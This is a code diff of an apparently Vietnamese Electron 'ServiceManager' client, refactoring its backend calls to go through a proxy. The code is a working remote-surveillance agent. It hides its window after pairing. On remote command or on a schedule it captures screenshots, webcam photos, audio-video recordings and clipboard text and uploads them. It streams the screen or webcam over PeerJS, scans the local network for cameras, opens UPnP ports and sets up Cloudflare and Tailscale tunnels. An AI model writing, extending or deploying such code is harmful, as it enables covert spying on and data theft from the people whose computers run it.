@@ -27,9 +27,9 @@
       justify-content:center; font-size:24px;
     }
     .logo-text { font-size:20px; font-weight:700; }
-    .logo-sub { font-size:12px; color:#64748b; }
-    .title { font-size:18px; font-weight:600; margin-bottom:8px; color:#f1f5f9; }
-    .desc { font-size:13px; color:#64748b; margin-bottom:24px; }
+    .logo-sub  { font-size:12px; color:#64748b; }
+    .title  { font-size:18px; font-weight:600; margin-bottom:8px; color:#f1f5f9; }
+    .desc   { font-size:13px; color:#64748b; margin-bottom:24px; }
     .device-id {
       font-size:42px; font-family:monospace; font-weight:bold;
       margin-bottom:24px; padding:18px 28px;
@@ -41,15 +41,14 @@
       padding:11px 22px; font-size:14px; border:none;
       border-radius:10px; cursor:pointer; font-weight:600;
     }
-    .btn-copy { background:#1e293b; color:#94a3b8; }
-    .btn-copy:hover { background:#334155; }
+    .btn-copy  { background:#1e293b; color:#94a3b8; }
+    .btn-copy:hover  { background:#334155; }
     .btn-close { background:#2563eb; color:white; }
     .btn-close:hover { background:#1d4ed8; }
     #liveIndicatorBanner {
       display:none; position:fixed; bottom:0; left:0; right:0;
       background:#dc2626; color:white; text-align:center;
-      padding:8px; font-size:13px; font-weight:600;
-      z-index:9999;
+      padding:8px; font-size:13px; font-weight:600; z-index:9999;
     }
   </style>
 </head>
@@ -66,7 +65,7 @@
     <div class="desc">Nhập ID này vào trang Manager để ghép nối.</div>
     <div class="device-id" id="display-id">Đang tải...</div>
     <div class="buttons">
-      <button class="btn-copy" id="btn-copy">Copy ID</button>
+      <button class="btn-copy"  id="btn-copy">Copy ID</button>
       <button class="btn-close" id="btn-close">Đã cài đặt — Ẩn</button>
     </div>
   </div>
@@ -75,23 +74,21 @@
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <script>
     'use strict';
-    const os         = require('os');
-    const net        = require('net');
+    const os = require('os');
+    const net = require('net');
     const { ipcRenderer, clipboard } = require('electron');
     const path = require('path');
     const fs   = require('fs');
 
-    // ── Supabase config từ localStorage ──
-    const SUPABASE_URL = (() => { try { return localStorage.getItem('sm_supabase_url') || ''; } catch(e) { return ''; } })();
-    const SUPABASE_KEY = (() => { try { return localStorage.getItem('sm_supabase_key') || ''; } catch(e) { return ''; } })();
-    const HEADERS = SUPABASE_URL && SUPABASE_KEY ? {
-      'apikey'       : SUPABASE_KEY,
-      'Authorization': `Bearer ${SUPABASE_KEY}`,
-      'Accept'       : 'application/json',
-      'Content-Type' : 'application/json'
-    } : null;
+    // ── Proxy config ─────────────────────────────────────────────────────────────
+    // Chỉ cần URL của Edge Function — không có anon key trong code
+    const PROXY_URL = (() => {
+      try { return localStorage.getItem('sm_proxy_url') || ''; } catch(e) { return ''; }
+    })();
 
-    // ── Device ID ──
+    // ── Device ID + Token ───────────────────────────────────────────────────
+    // device_id: ID nhận diện thiết bị (hiển thị cho user)
+    // device_token: token bí mật, chỉ nằm trong localStorage của máy này
     let deviceId = localStorage.getItem('sm_device_id');
     if (!deviceId) {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -101,12 +98,52 @@
       localStorage.setItem('sm_device_id', deviceId);
     }
 
+    let deviceToken = localStorage.getItem('sm_device_token');
+    if (!deviceToken) {
+      // Sinh token ngẫu nhiên 32 bytes hex — không có crypto.randomUUID? dùng fallback
+      try {
+        const arr = new Uint8Array(32);
+        crypto.getRandomValues(arr);
+        deviceToken = Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
+      } catch(e) {
+        deviceToken = Date.now().toString(36) + Math.random().toString(36).slice(2);
+      }
+      localStorage.setItem('sm_device_token', deviceToken);
+    }
+
+    // ── Proxy helper ──────────────────────────────────────────────────────────
+    // Gọi sm-proxy Edge Function. Không bao giờ gọi Supabase trực tiếp từ client.
+    async function proxy(action, params = {}) {
+      if (!PROXY_URL) return null;
+      try {
+        const res = await fetch(PROXY_URL, {
+          method : 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body   : JSON.stringify({
+            action,
+            device_id   : deviceId,
+            device_token: deviceToken,
+            ...params
+          })
+        });
+        if (!res.ok) {
+          const txt = await res.text();
+          console.error(`[proxy] ${action} error ${res.status}:`, txt);
+          return null;
+        }
+        return await res.json();
+      } catch(e) {
+        console.error('[proxy] Network error:', e.message);
+        return null;
+      }
+    }
+
+    // ── Pairing overlay ───────────────────────────────────────────────────
     const isPaired = localStorage.getItem('sm_paired') === '1';
     if (!isPaired) {
       document.getElementById('pairing-overlay').style.display = 'flex';
       document.getElementById('display-id').textContent = deviceId;
     }
-
     document.getElementById('btn-copy').addEventListener('click', () => {
       clipboard.writeText(deviceId);
       document.getElementById('btn-copy').textContent = 'Copied!';
@@ -118,73 +155,45 @@
       ipcRenderer.invoke('hide-window');
     });
 
-    // ── Supabase helper ──
-    async function supabaseRequest(endpoint, options = {}) {
-      if (!SUPABASE_URL || !SUPABASE_KEY) return null;
-      try {
-        const res = await fetch(`${SUPABASE_URL}${endpoint}`, {
-          ...options,
-          headers: { ...HEADERS, ...(options.headers || {}) }
-        });
-        if (!res.ok) { console.error('[supabase] Error:', await res.text()); return null; }
-        if (res.status === 204) return true;
-        return await res.json();
-      } catch(err) {
-        console.error('[supabase] Network error:', err.message);
-        return null;
-      }
-    }
+    // ── Optional modules ─────────────────────────────────────────────────
+    let upnpManager      = null;
+    let go2rtcMgr        = null;
+    let autoNetwork      = null;
+    let tunnelMgr        = null;
+    try { upnpManager  = require('../src/upnp-manager');   } catch(e) { console.log('[client] upnp-manager not loaded:', e.message); }
+    try { go2rtcMgr    = require('../src/go2rtc-manager');  } catch(e) { console.log('[client] go2rtc-manager not loaded:', e.message); }
+    try { autoNetwork  = require('../src/auto-network');    } catch(e) { console.log('[client] auto-network not loaded:', e.message); }
+    try { tunnelMgr    = require('../src/tunnel-manager');  } catch(e) { console.log('[client] tunnel-manager not loaded:', e.message); }
 
-    // ── Optional modules ──
-    let upnpManager     = null;
-    let go2rtcMgr       = null;
-    let autoNetwork     = null;
-    let tunnelMgr       = null;
-    let startupMigration = null;
-    try { upnpManager      = require('../src/upnp-manager');        } catch(e) { console.log('[client] upnp-manager not loaded:', e.message); }
-    try { go2rtcMgr        = require('../src/go2rtc-manager');       } catch(e) { console.log('[client] go2rtc-manager not loaded:', e.message); }
-    try { autoNetwork      = require('../src/auto-network');         } catch(e) { console.log('[client] auto-network not loaded:', e.message); }
-    try { tunnelMgr        = require('../src/tunnel-manager');       } catch(e) { console.log('[client] tunnel-manager not loaded:', e.message); }
-    try { startupMigration = require('../src/startup-migration');    } catch(e) { console.log('[client] startup-migration not loaded:', e.message); }
-
-    // ── System info ──
+    // ── System info ────────────────────────────────────────────────────────
     function getSystemInfo() {
-      const cpus = os.cpus();
-      return { hostname: os.hostname(), platform: os.platform(), arch: os.arch(), memory: Math.round(os.totalmem()), cpus: cpus.length };
+      return {
+        hostname: os.hostname(), platform: os.platform(),
+        arch: os.arch(), memory: Math.round(os.totalmem()), cpus: os.cpus().length
+      };
     }
 
-    // ── Register & Heartbeat ──
+    // ── Register & Heartbeat (qua proxy) ──────────────────────────────
     async function registerDevice() {
       const sys = getSystemInfo();
-      await supabaseRequest('/rest/v1/sm_devices?on_conflict=device_id', {
-        method : 'POST',
-        headers: { 'Prefer': 'resolution=merge-duplicates' },
-        body   : JSON.stringify({
-          device_id: deviceId, hostname: sys.hostname, platform: sys.platform,
-          arch: sys.arch, memory: sys.memory, cpus: sys.cpus,
-          online: true, last_seen: new Date().toISOString()
-        })
-      });
+      await proxy('register', sys);
     }
-
     async function heartbeat() {
-      await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
-        method: 'PATCH',
-        body  : JSON.stringify({ online: true, last_seen: new Date().toISOString() })
-      });
+      await proxy('heartbeat');
     }
 
+    // ── Settings (mặc định tất đều false — chỉ bật khi Manager thiết lập) ──────
     let currentSettings = {
       screen_capture_on: false, screen_interval_min: 5,
       webcam_capture_on: false, webcam_interval_min: 5,
-      webcam_record_on: false,  webcam_record_interval_min: 15,
+      webcam_record_on : false, webcam_record_interval_min: 15,
       clipboard_monitor_on: false
     };
 
     async function fetchSettings() {
-      const res = await supabaseRequest(`/rest/v1/sm_devices?select=*&device_id=eq.${deviceId}`);
-      if (res && res.length > 0) {
-        const d = res[0];
+      const res = await proxy('get_settings');
+      if (res?.ok && res.settings) {
+        const d = res.settings;
         currentSettings.screen_capture_on         = !!d.screen_capture_on;
         currentSettings.screen_interval_min        = d.screen_interval_min || 5;
         currentSettings.webcam_capture_on          = !!d.webcam_capture_on;
@@ -196,13 +205,11 @@
       }
     }
 
-    window.addEventListener('beforeunload', async () => {
-      await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
-        method: 'PATCH', body: JSON.stringify({ online: false })
-      });
+    window.addEventListener('beforeunload', () => {
+      proxy('update_field', { field: 'online', value: false });
     });
 
-    // ── Network utils ──
+    // ── Network utils ───────────────────────────────────────────────────
     function getLocalIpAndSubnet() {
       const nets = os.networkInterfaces();
       for (const name of Object.keys(nets)) {
@@ -214,7 +221,7 @@
     }
 
     function checkPort(ip, port, timeout = 350) {
-      return new Promise((resolve) => {
+      return new Promise(resolve => {
         const socket = new net.Socket();
         socket.setTimeout(timeout);
         let open = false;
@@ -229,7 +236,7 @@
     async function scanNetworkDevices(targetSubnets = null) {
       const network = getLocalIpAndSubnet();
       const subnets = [];
-      if (targetSubnets && Array.isArray(targetSubnets) && targetSubnets.length > 0) {
+      if (targetSubnets?.length) {
         subnets.push(...targetSubnets);
       } else if (network) {
         const p = network.ip.split('.').map(Number);
@@ -240,11 +247,8 @@
         subnets.push('192.168.1', '192.168.0');
       }
       const IPs = [];
-      for (const sub of subnets) {
-        for (let i = 1; i < 255; i++) IPs.push(`${sub}.${i}`);
-      }
+      for (const sub of subnets) for (let i = 1; i < 255; i++) IPs.push(`${sub}.${i}`);
       const ports = [554, 2020, 34567, 8899, 80, 8000];
-      const concurrency = 60;
       let idx = 0;
       const found = {};
       async function worker() {
@@ -257,15 +261,14 @@
           }
         }
       }
-      const workers = [];
-      for (let w = 0; w < concurrency; w++) workers.push(worker());
-      await Promise.all(workers);
+      await Promise.all(Array.from({ length: 60 }, worker));
       return Object.values(found).map(d => {
         let type = 'device', label = 'Thiết bị mạng', isCamera = false, defaultRtspPath = '/stream1';
         if (d.openPorts.includes(2020) || (d.openPorts.includes(554) && !d.openPorts.includes(34567))) {
           type = 'tapo'; label = 'TP-Link Tapo Camera'; isCamera = true;
         } else if (d.openPorts.includes(34567)) {
-          type = 'icsee'; label = 'ICSee / Xiongmai Camera'; isCamera = true; defaultRtspPath = '/cam/realmonitor?channel=1&subtype=0';
+          type = 'icsee'; label = 'ICSee / Xiongmai Camera'; isCamera = true;
+          defaultRtspPath = '/cam/realmonitor?channel=1&subtype=0';
         } else if (d.openPorts.includes(8000) || d.openPorts.includes(554)) {
           type = 'camera'; label = 'Camera IP (RTSP)'; isCamera = true;
         } else if (d.openPorts.includes(80)) {
@@ -283,29 +286,26 @@
       } catch(e) { return { success: false, error: e.message }; }
     }
 
-    // ── Storage upload ──
-    async function uploadStorage(storagePath, blob, contentType) {
-      if (!SUPABASE_URL || !SUPABASE_KEY) return null;
-      const url = `${SUPABASE_URL}/storage/v1/object/sm-captures/${storagePath}`;
+    // ── Upload capture qua proxy (base64) ──────────────────────────────
+    async function uploadCapture(type, blob, contentType, filename, thumbnail = null) {
       try {
-        const res = await fetch(url, {
-          method : 'POST',
-          headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': contentType },
-          body   : blob
+        const b64 = await new Promise(resolve => {
+          const reader = new FileReader();
+          reader.onload = () => resolve(reader.result.split(',')[1]);
+          reader.readAsDataURL(blob);
         });
-        if (res.ok) return `${SUPABASE_URL}/storage/v1/object/public/sm-captures/${storagePath}`;
-      } catch(e) { console.error('[upload]', e.message); }
-      return null;
+        const res = await proxy('upload_capture', {
+          type, filename, content_type: contentType, data: b64, thumbnail
+        });
+        return res?.url || null;
+      } catch(e) { console.error('[upload]', e.message); return null; }
     }
 
     async function recordCapture(type, fileUrl, metadata = {}, thumbnail = null) {
-      await supabaseRequest('/rest/v1/sm_captures', {
-        method: 'POST',
-        body  : JSON.stringify({ device_id: deviceId, type, storage_path: fileUrl, thumbnail, metadata })
-      });
+      await proxy('record_capture', { type, storage_path: fileUrl, metadata, thumbnail });
     }
 
-    // ── Screenshot ──
+    // ── Screenshot ─────────────────────────────────────────────────────────
     async function captureScreenshot() {
       try {
         const source = await ipcRenderer.invoke('get-desktop-source');
@@ -323,18 +323,18 @@
         const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
         const blob    = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
         video.srcObject.getTracks().forEach(t => t.stop());
-        const filename = `${deviceId}/screenshot/${Date.now()}.jpg`;
-        const url = await uploadStorage(filename, blob, 'image/jpeg');
-        await recordCapture('screenshot', url || filename, {}, dataUrl);
+        const filename = `screenshot/${Date.now()}.jpg`;
+        const url = await uploadCapture('screenshot', blob, 'image/jpeg', filename, dataUrl);
+        if (!url) await recordCapture('screenshot', filename, {}, dataUrl);
         return dataUrl;
       } catch(e) { console.error('[screenshot]', e); return null; }
     }
 
-    // ── Webcam ──
+    // ── Webcam ────────────────────────────────────────────────────────────
     async function captureWebcamPhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
+        const video  = document.createElement('video');
         video.srcObject = stream;
         await new Promise(r => video.onloadedmetadata = r);
         video.play();
@@ -345,9 +345,9 @@
         const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
         const blob    = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
         stream.getTracks().forEach(t => t.stop());
-        const filename = `${deviceId}/webcam/${Date.now()}.jpg`;
-        const url = await uploadStorage(filename, blob, 'image/jpeg');
-        await recordCapture('webcam', url || filename, {}, dataUrl);
+        const filename = `webcam/${Date.now()}.jpg`;
+        const url = await uploadCapture('webcam', blob, 'image/jpeg', filename, dataUrl);
+        if (!url) await recordCapture('webcam', filename, {}, dataUrl);
         return dataUrl;
       } catch(e) { console.error('[webcam]', e); return null; }
     }
@@ -358,14 +358,14 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
           .catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
-        recordedChunks = [];
+        mediaRecorder   = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+        recordedChunks  = [];
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
         mediaRecorder.onstop = async () => {
-          const blob = new Blob(recordedChunks, { type: 'video/webm' });
-          const filename = `${deviceId}/webcam_video/${Date.now()}.webm`;
-          const url = await uploadStorage(filename, blob, 'video/webm');
-          if (url) await recordCapture('webcam_video', url);
+          const blob     = new Blob(recordedChunks, { type: 'video/webm' });
+          const filename = `webcam_video/${Date.now()}.webm`;
+          const url = await uploadCapture('webcam_video', blob, 'video/webm', filename);
+          if (!url) await recordCapture('webcam_video', filename);
           stream.getTracks().forEach(t => t.stop());
           mediaRecorder = null;
         };
@@ -377,26 +377,37 @@
       if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
     }
 
-    // ── Clipboard ──
+    // ── Clipboard ──────────────────────────────────────────────────────────
     let lastClipboardText = '';
     function checkClipboard() {
       if (!currentSettings.clipboard_monitor_on) return;
       const txt = clipboard.readText();
-      if (txt && txt !== lastClipboardText) { lastClipboardText = txt; recordCapture('clipboard', null, { content: txt }); }
+      if (txt && txt !== lastClipboardText) {
+        lastClipboardText = txt;
+        recordCapture('clipboard', null, { content: txt });
+      }
     }
 
-    // ── Timer manager ──
+    // ── Timer manager ───────────────────────────────────────────────────
     let timers = {};
     function applySettings() {
       const start = (key, fn, ms) => { if (!timers[key]) timers[key] = setInterval(fn, ms); };
-      const stop  = (key) => { clearInterval(timers[key]); timers[key] = null; };
-      currentSettings.screen_capture_on    ? start('screen',       captureScreenshot,  currentSettings.screen_interval_min * 60000)  : stop('screen');
-      currentSettings.webcam_capture_on    ? start('webcam',       captureWebcamPhoto, currentSettings.webcam_interval_min * 60000)  : stop('webcam');
-      currentSettings.webcam_record_on     ? start('webcamRecord', () => startWebcamRecord(30), currentSettings.webcam_record_interval_min * 60000) : stop('webcamRecord');
-      currentSettings.clipboard_monitor_on ? start('clipboard',    checkClipboard,     10000) : stop('clipboard');
+      const stop  = key => { clearInterval(timers[key]); timers[key] = null; };
+      currentSettings.screen_capture_on
+        ? start('screen', captureScreenshot, currentSettings.screen_interval_min * 60000)
+        : stop('screen');
+      currentSettings.webcam_capture_on
+        ? start('webcam', captureWebcamPhoto, currentSettings.webcam_interval_min * 60000)
+        : stop('webcam');
+      currentSettings.webcam_record_on
+        ? start('webcamRecord', () => startWebcamRecord(30), currentSettings.webcam_record_interval_min * 60000)
+        : stop('webcamRecord');
+      currentSettings.clipboard_monitor_on
+        ? start('clipboard', checkClipboard, 10000)
+        : stop('clipboard');
     }
 
-    // ── PeerJS ──
+    // ── PeerJS ──────────────────────────────────────────────────────────────
     const peer = new Peer(deviceId, {
       config: { iceServers: [
         { urls: 'stun:stun.l.google.com:19302' },
@@ -405,7 +416,7 @@
     });
     peer.on('open', id => console.log('[peer] Connected as:', id));
 
-    peer.on('call', async (call) => {
+    peer.on('call', async call => {
       let stream = null;
       const type = call.metadata?.type || 'webcam';
       try {
@@ -418,7 +429,8 @@
             });
           }
         }
-        if (!stream) stream = await navigator.mediaDevices.getUserMedia({ video: { width:{ideal:1280}, height:{ideal:720} }, audio: true })
+        if (!stream) stream = await navigator.mediaDevices
+          .getUserMedia({ video: { width:{ideal:1280}, height:{ideal:720} }, audio: true })
           .catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
         call.answer(stream);
         showLiveIndicator(true, type);
@@ -434,27 +446,41 @@
 
     peer.on('connection', conn => {
       conn.on('data', async data => {
-        switch(data.cmd) {
-          case 'snap-screen':        { const url = await captureScreenshot();  conn.send({ cmd:'snap-screen-result',  url }); break; }
-          case 'snap-webcam':        { const url = await captureWebcamPhoto(); conn.send({ cmd:'snap-webcam-result',  url }); break; }
-          case 'get-clipboard':      { const text = clipboard.readText(); await recordCapture('clipboard',null,{text}); conn.send({ cmd:'get-clipboard-result', text }); break; }
-          case 'sync-settings':      { currentSettings = { ...currentSettings, ...data }; applySettings(); conn.send({ cmd:'sync-settings-ok' }); break; }
-          case 'start-webcam-record':{ startWebcamRecord(data.duration || 30); conn.send({ cmd:'webcam-record-started' }); break; }
-          case 'stop-webcam-record': { stopWebcamRecord(); conn.send({ cmd:'webcam-record-stopped' }); break; }
+        switch (data.cmd) {
+          case 'snap-screen':  { const url = await captureScreenshot();  conn.send({ cmd:'snap-screen-result',  url }); break; }
+          case 'snap-webcam':  { const url = await captureWebcamPhoto(); conn.send({ cmd:'snap-webcam-result',  url }); break; }
+          case 'get-clipboard':{
+            const text = clipboard.readText();
+            await recordCapture('clipboard', null, { text });
+            conn.send({ cmd:'get-clipboard-result', text });
+            break;
+          }
+          case 'sync-settings': {
+            currentSettings = { ...currentSettings, ...data };
+            applySettings();
+            conn.send({ cmd:'sync-settings-ok' });
+            break;
+          }
+          case 'start-webcam-record': { startWebcamRecord(data.duration || 30); conn.send({ cmd:'webcam-record-started' }); break; }
+          case 'stop-webcam-record':  { stopWebcamRecord(); conn.send({ cmd:'webcam-record-stopped' }); break; }
           case 'get-network-info': {
             const netInfo = getLocalIpAndSubnet();
             let extIp = upnpManager?.getExternalIp() || null;
-            if (!extIp) { try { const r = await fetch('https://api.ipify.org?format=json'); extIp = (await r.json()).ip; } catch(e) {} }
+            if (!extIp) { try { extIp = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e) {} }
             conn.send({ cmd:'get-network-info-result', data: {
-              localIp: netInfo?.ip || '127.0.0.1',
-              subnet: netInfo?.netmask || '255.255.255.0',
-              externalIp: extIp || 'Chưa phát hiện',
+              localIp      : netInfo?.ip      || '127.0.0.1',
+              subnet       : netInfo?.netmask || '255.255.255.0',
+              externalIp   : extIp            || 'Chưa phát hiện',
               upnpAvailable: upnpManager?.isAvailable() || false,
-              mappings: upnpManager?.getMappings() || []
+              mappings     : upnpManager?.getMappings()  || []
             }});
             break;
           }
-          case 'scan-wifi-devices':  { const devices = await scanNetworkDevices(data.targetSubnets); conn.send({ cmd:'scan-wifi-devices-result', devices }); break; }
+          case 'scan-wifi-devices': {
+            const devices = await scanNetworkDevices(data.targetSubnets);
+            conn.send({ cmd:'scan-wifi-devices-result', devices });
+            break;
+          }
           case 'open-port': {
             let ok = false;
             if (upnpManager) ok = await upnpManager.openCustomPort(data.publicPort, data.privatePort, data.targetIp, data.protocol||'TCP', data.description||'');
@@ -469,15 +495,21 @@
           }
           case 'setup-camera-stream': {
             const res = await setupCameraStream(data.rtspUrl, data.streamName||'camera');
-            if (data.cameraIp) await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, { method:'PATCH', body: JSON.stringify({ camera_ip: data.cameraIp, camera_rtsp_port: 554 }) });
+            if (data.cameraIp) {
+              await proxy('update_field', { field: 'camera_ip', value: data.cameraIp });
+              await proxy('update_field', { field: 'camera_rtsp_port', value: 554 });
+            }
             conn.send({ cmd:'setup-camera-stream-result', ...res });
             break;
           }
           case 'webrtc-exchange': {
             try {
-              const res = await fetch(`http://127.0.0.1:1984/api/webrtc?src=${encodeURIComponent(data.src||'camera')}`, { method:'POST', headers:{'Content-Type':'application/sdp'}, body: data.offer });
+              const res = await fetch(
+                `http://127.0.0.1:1984/api/webrtc?src=${encodeURIComponent(data.src||'camera')}`,
+                { method:'POST', headers:{'Content-Type':'application/sdp'}, body: data.offer }
+              );
               if (res.ok) conn.send({ cmd:'webrtc-exchange-answer', answer: await res.text(), success: true });
-              else conn.send({ cmd:'webrtc-exchange-answer', success: false, error: await res.text() });
+              else        conn.send({ cmd:'webrtc-exchange-answer', success: false, error: await res.text() });
             } catch(e) { conn.send({ cmd:'webrtc-exchange-answer', success: false, error: e.message }); }
             break;
           }
@@ -490,7 +522,9 @@
             break;
           }
           case 'get-tunnel-status': {
-            const ts = tunnelMgr ? tunnelMgr.getStatus() : { cloudflare:{running:false,url:null}, tailscale:{running:false,ip:null}, ready:false };
+            const ts = tunnelMgr
+              ? tunnelMgr.getStatus()
+              : { cloudflare:{running:false,url:null}, tailscale:{running:false,ip:null}, ready:false };
             conn.send({ cmd:'get-tunnel-status-result', data: ts });
             break;
           }
@@ -521,7 +555,7 @@
       });
     });
 
-    // ── Alarm ──
+    // ── Alarm ─────────────────────────────────────────────────────────────
     let audioCtx;
     function playAlarm() {
       if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -537,90 +571,87 @@
       osc.start(); osc.stop(audioCtx.currentTime + 5);
     }
 
-    // ── Helper: khởi động tunnel với config hiện tại ──
+    // ── Tunnel helpers ──────────────────────────────────────────────────
     function getTunnelConfig() {
-      let cfg = {};
       try {
         const cfgPath = path.join(os.homedir(), 'AppData', 'Roaming', 'ServiceManager-Client', 'config.json');
         const raw = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
-        if (raw.tailscale_authkey) cfg.tailscale_authkey = raw.tailscale_authkey;
-      } catch(e) {}
-      return cfg;
+        return raw.tailscale_authkey ? { tailscale_authkey: raw.tailscale_authkey } : {};
+      } catch(e) { return {}; }
     }
 
     async function initTunnel() {
       if (!tunnelMgr) return;
+      // Thay supabaseReq bằng proxy wrapper để tunnel-manager cũng dùng proxy
+      const proxyForTunnel = async (endpoint, opts = {}) => {
+        // tunnel-manager cần gọi PATCH sm_devices — chuyển sang update_field
+        const body = opts.body ? JSON.parse(opts.body) : {};
+        const results = [];
+        for (const [field, value] of Object.entries(body)) {
+          results.push(await proxy('update_field', { field, value }));
+        }
+        return results[0] || true;
+      };
       return tunnelMgr.init({
-        supabaseReq: supabaseRequest,
+        supabaseReq: proxyForTunnel,
         devId      : deviceId,
         config     : getTunnelConfig()
       });
     }
 
-    // ── IPC: lắng nghe network-changed từ main process ──
-    // Main process (network-watcher.js) phát hiện IP đổi / wakeup → gửi xuống → restart tunnel
+    // ── IPC: network-changed → restart tunnel ───────────────────────────
     ipcRenderer.on('network-changed', (_, info) => {
       console.log(`[client] ⚡ Network changed (${info.reason}: ${info.ip}) → restarting tunnels...`);
-      if (tunnelMgr) {
-        tunnelMgr.stop();
-        setTimeout(() => initTunnel(), 2000);
-      }
+      if (tunnelMgr) { tunnelMgr.stop(); setTimeout(() => initTunnel(), 2000); }
     });
-
     ipcRenderer.on('network-lost', () => {
       console.log('[client] ❌ Network lost. Tunnels will auto-retry when reconnected.');
-      // Không cần làm gì — tunnel-manager tự retry mỗi 5 phút
     });
 
-    // ── Startup ──
+    // ── Startup ─────────────────────────────────────────────────────────────
     async function start() {
-      // 1. Auto migration Supabase (chạy 1 lần, không blocking)
-      if (startupMigration) {
-        startupMigration.runMigrations(supabaseRequest, SUPABASE_URL, SUPABASE_KEY, deviceId)
-          .catch(e => console.warn('[migration] Error:', e.message));
-      }
-
-      // 2. UPnP
+      // 1. UPnP
       if (upnpManager) {
         upnpManager.start().then(available => {
           if (available) {
             const extIp = upnpManager.getExternalIp();
-            if (extIp) supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, { method:'PATCH', body: JSON.stringify({ external_ip: extIp }) });
+            if (extIp) proxy('update_field', { field: 'external_ip', value: extIp });
           }
         }).catch(e => console.log('[upnp] start error:', e.message));
       }
 
-      // 3. Register & heartbeat
+      // 2. Register + heartbeat
       await registerDevice();
       await fetchSettings();
       setInterval(async () => { await heartbeat(); await fetchSettings(); }, 45000);
 
-      // 4. Auto-network (scan camera, go2rtc)
+      // 3. Auto-network (scan camera, go2rtc)
       if (autoNetwork) {
         let savedCreds = null;
         try { savedCreds = JSON.parse(localStorage.getItem('sm_auto_camera_creds')); } catch(e) {}
-        if (!savedCreds) {
-          try {
-            const cam = JSON.parse(localStorage.getItem('sm_camera_' + deviceId));
-            if (cam?.user || cam?.pass) savedCreds = { user: cam.user||'', pass: cam.pass||'' };
-          } catch(e) {}
-        }
         autoNetwork.init({
           upnpMgr    : upnpManager,
           go2rtcMgr  : go2rtcMgr,
-          supabaseReq: supabaseRequest,
+          supabaseReq: (ep, opts) => {
+            // Chuyển sang proxy để auto-network cũng không dùng anon key
+            const body = opts?.body ? JSON.parse(opts.body) : {};
+            const promises = Object.entries(body).map(([field, value]) =>
+              proxy('update_field', { field, value })
+            );
+            return Promise.all(promises);
+          },
           devId      : deviceId,
           credentials: savedCreds
-        }).then(r => console.log('[auto-net] Done:', JSON.stringify(r, null, 2)))
+        }).then(r => console.log('[auto-net] Done:', JSON.stringify(r)))
           .catch(e => console.log('[auto-net] Error:', e.message));
       }
 
-      // 5. Tunnel manager (Cloudflare + Tailscale — Japan ISP / DS-Lite safe)
+      // 4. Tunnel (Cloudflare + Tailscale)
       initTunnel()
         .then(r => {
           if (r) {
-            console.log('[tunnel] ✅ Cloudflare URL:', r.cfUrl || 'N/A');
-            console.log('[tunnel] ✅ Tailscale IP  :', r.tsIp  || 'N/A');
+            console.log('[tunnel] ✅ Cloudflare:', r.cfUrl || 'N/A');
+            console.log('[tunnel] ✅ Tailscale :', r.tsIp  || 'N/A');
           }
         })
         .catch(e => console.log('[tunnel] Error:', e.message));
